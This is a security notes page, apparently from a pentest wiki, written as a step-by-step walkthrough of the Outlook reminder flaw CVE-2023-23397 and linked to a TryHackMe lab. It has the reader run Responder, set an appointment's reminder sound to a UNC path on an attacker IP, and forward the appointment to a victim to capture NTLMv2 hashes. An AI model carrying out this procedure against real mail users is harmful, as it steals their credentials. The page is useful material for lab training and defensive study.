@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Outlook Reminder Privilege Escalation - readloud.org</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Outlook Reminder Privilege Escalation", url: "#_top", children: [
+              {title: "Exploitation", url: "#exploitation" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="outlook-reminder-privilege-escalation">Outlook Reminder Privilege Escalation</h1>
+<p>The Outlook’s Reminder method is vulnerable to privilege escalation by abusing the UNC (Universal Naming Convention) file path of the reminder sound. CVE-2023-23397.</p>
+<div class="language-text highlight"><pre><span></span><code>- [outlookntlmleak](https://tryhackme.com/room/outlookntlmleak)
+</code></pre></div>
+<h2 id="exploitation">Exploitation</h2>
+<p>To carry out this attack, the OutlookSpy is required. So please install it before proceeding.</p>
+<h3 id="1-start-responder">1. Start Responder</h3>
+<p>First off, start responder in our local machine to capture NetNTLM authentication.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># -I: Interface (eth0, tun0, etc.)</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>responder<span class="w"> </span>-I<span class="w"> </span>tun0
+</span></code></pre></div>
+<h3 id="2-modify-reminder-settings-using-outlookspy">2. Modify Reminder Settings using OutlookSpy</h3>
+<ol>
+<li>In Outlook, select Home tab and click New Items then choose Appointment in drawer menu.</li>
+<li>In new Appointment window, select OutlookSpy tab then click CurrentItem. The AppointmentItem window will open.</li>
+<li>
+<p>In AppointmentItem window, click Script tab and input the following value.</p>
+<p>Replace “10.0.0.1” with your local server ip.</p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="n">AppointmentItem</span><span class="p">.</span><span class="n">ReminderOverrideDefault</span> <span class="p">=</span> <span class="n">true</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">AppointmentItem</span><span class="p">.</span><span class="n">ReminderPlaySound</span> <span class="p">=</span> <span class="n">true</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a><span class="n">AppointmentItem</span><span class="p">.</span><span class="n">ReminderSoundFile</span> <span class="p">=</span><span class="s2">&quot;\\10.0.0.1\test.wav&quot;</span>
+</span></code></pre></div>
+<p>After that, click Run button to apply the new properties.</p>
+<p>To confirm if the properties applied, click Properties tab and choose the following items in left pane.</p>
+<ul>
+<li>ReminderOverrideDefault</li>
+<li>ReminderPlaySound</li>
+<li>ReminderSoundFile</li>
+</ul>
+<p>Close the AppointmentItem window.</p>
+</li>
+</ol>
+<h3 id="3-attach-new-appointment">3. Attach New Appointment</h3>
+<ol>
+<li>Click Appointment tab and click Reminder in the Options section. Then set 0 minutes.</li>
+<li>Fill the Subject, Location and Message with arbitrary values.</li>
+<li>To send the appointment to the victim address, click Forward in Actions section in Appointment tab. Then enter the victim email address as a destination. Now click Send button.</li>
+</ol>
+<h3 id="4-capture-the-victims-ntlmv2-hash-with-responder">4. Capture the Victim’s NTLMv2 Hash with Responder</h3>
+<ol>
+<li>Because we set the reminder with 0 minutes, we should see the reminder popup immediately after saving.</li>
+<li>In our terminal, responder, that we’ve launched, captured the NTLMv2 hash.</li>
+</ol>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/os/windows/privilege-escalation/outlook-reminder-privilege-escalation.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
